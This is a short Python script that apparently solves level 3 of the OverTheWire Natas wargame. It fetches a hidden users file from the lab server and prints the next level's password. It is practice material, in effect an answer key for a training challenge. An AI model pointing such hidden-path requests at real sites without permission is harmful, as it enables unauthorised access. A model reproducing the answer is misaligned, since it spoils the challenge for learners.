#!/usr/bin/python
# coding: utf-8
from requests.auth import HTTPBasicAuth
import requests
import sys
import re

def exploit(level3pass):
    print "{+} Natas Level 3. Doing magic..."
    try:
        r = requests.get(url="http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt", auth=HTTPBasicAuth('natas3', level3pass))
    except Exception:
        print "{-} Something fucked up, request failed. Bailing. Maybe your password was wrong?"
        return None
    password = re.findall("natas4:(.*?)\n", r.text)
    if len(password):
        return password[0]
    return None

def main(args):
    if len(args) != 2:
        sys.exit("use: %s level3password" %(args[0]))
    level4pass = exploit(args[1])
    if level4pass != None:
        print "{$$} Level 4 Password is: %s" %(level4pass)

if __name__ == "__main__":
    main(args=sys.argv)
